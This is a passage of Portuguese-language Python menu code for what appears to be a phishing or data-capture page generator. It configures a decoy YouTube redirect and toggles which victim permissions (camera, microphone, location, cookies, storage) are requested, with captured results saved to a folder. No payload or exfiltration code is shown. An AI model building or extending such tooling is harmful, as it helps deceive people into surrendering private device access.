        else:
            print(f"{colors.RED}[-] Opção inválida!{colors.RESET}")
            time.sleep(1)
            advanced_options()
    except KeyboardInterrupt:
        print(f"\n{colors.YELLOW}[!] Operação cancelada pelo usuário{colors.RESET}")
        main_menu()

# Configurar redirecionamento do YouTube
def configure_youtube():
    banner()
    print(f"{colors.CYAN}=== CONFIGURAR REDIRECIONAMENTO DO YOUTUBE ==={colors.RESET}\n")
    
    CONFIG['youtube_redirect'] = True
    CONFIG['redirect_url'] = "https://www.youtube.com"
    
    print(f"{colors.BLUE}[1] {colors.WHITE}Usar vídeo padrão (Rick Astley){colors.RESET}")
    print(f"{colors.BLUE}[2] {colors.WHITE}Inserir ID do vídeo do YouTube{colors.RESET}")
    print(f"{colors.BLUE}[0] {colors.WHITE}Voltar{colors.RESET}")
    
    try:
        choice = input(f"\n{colors.YELLOW}[?] Selecione uma opção: {colors.RESET}")
        
        if choice == '1':
            CONFIG['youtube_video'] = "dQw4w9WgXcQ"
            print(f"{colors.GREEN}[+] Vídeo padrão configurado (Rick Astley){colors.RESET}")
            time.sleep(1)
            advanced_options()
        elif choice == '2':
            video_id = input(f"{colors.YELLOW}[?] Insira o ID do vídeo do YouTube: {colors.RESET}")
            if len(video_id) == 11:  # IDs do YouTube têm 11 caracteres
                CONFIG['youtube_video'] = video_id
                print(f"{colors.GREEN}[+] ID do vídeo configurado: {video_id}{colors.RESET}")
            else:
                print(f"{colors.RED}[-] ID inválido! Deve ter 11 caracteres{colors.RESET}")
            time.sleep(1)
            advanced_options()
        elif choice == '0':
            advanced_options()
        else:
            print(f"{colors.RED}[-] Opção inválida!{colors.RESET}")
            time.sleep(1)
            configure_youtube()
    except KeyboardInterrupt:
        print(f"\n{colors.YELLOW}[!] Operação cancelada pelo usuário{colors.RESET}")
        advanced_options()

# Configurar permissões
def configure_permissions():
    banner()
    print(f"{colors.CYAN}=== CONFIGURAR PERMISSÕES SOLICITADAS ==={colors.RESET}\n")
    print(f"{colors.BLUE}[1] {colors.WHITE}Câmera: {'✅' if CONFIG['requested_permissions']['camera'] else '❌'}{colors.RESET}")
    print(f"{colors.BLUE}[2] {colors.WHITE}Microfone: {'✅' if CONFIG['requested_permissions']['microphone'] else '❌'}{colors.RESET}")
    print(f"{colors.BLUE}[3] {colors.WHITE}Localização: {'✅' if CONFIG['requested_permissions']['location'] else '❌'}{colors.RESET}")
    print(f"{colors.BLUE}[4] {colors.WHITE}Notificações: {'✅' if CONFIG['requested_permissions']['notifications'] else '❌'}{colors.RESET}")
    print(f"{colors.BLUE}[5] {colors.WHITE}Cookies: {'✅' if CONFIG['requested_permissions']['cookies'] else '❌'}{colors.RESET}")
    print(f"{colors.BLUE}[6] {colors.WHITE}Armazenamento: {'✅' if CONFIG['requested_permissions']['storage'] else '❌'}{colors.RESET}")
    print(f"{colors.BLUE}[0] {colors.WHITE}Voltar{colors.RESET}")
    
    try:
        choice = input(f"\n{colors.YELLOW}[?] Selecione uma permissão para alternar: {colors.RESET}")
        
        if choice == '1':
            CONFIG['requested_permissions']['camera'] = not CONFIG['requested_permissions']['camera']
        elif choice == '2':
            CONFIG['requested_permissions']['microphone'] = not CONFIG['requested_permissions']['microphone']
        elif choice == '3':
            CONFIG['requested_permissions']['location'] = not CONFIG['requested_permissions']['location']
        elif choice == '4':
            CONFIG['requested_permissions']['notifications'] = not CONFIG['requested_permissions']['notifications']
        elif choice == '5':
            CONFIG['requested_permissions']['cookies'] = not CONFIG['requested_permissions']['cookies']
        elif choice == '6':
            CONFIG['requested_permissions']['storage'] = not CONFIG['requested_permissions']['storage']
        elif choice == '0':
            advanced_options()
            return
        else:
            print(f"{colors.RED}[-] Opção inválida!{colors.RESET}")
            time.sleep(1)
        
        configure_permissions()
    except KeyboardInterrupt:
        print(f"\n{colors.YELLOW}[!] Operação cancelada pelo usuário{colors.RESET}")
        advanced_options()

# Ponto de entrada
if __name__ == '__main__':
    try:
        # Verificar se a pasta de resultados existe
        if not os.path.exists(CONFIG['save_path']):
            os.makedirs(CONFIG['save_path'])
        
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{colors.RED}[!] Programa interrompido pelo usuário{colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{colors.RED}[!] Erro: {e}{colors.RESET}")
        sys.exit(1)
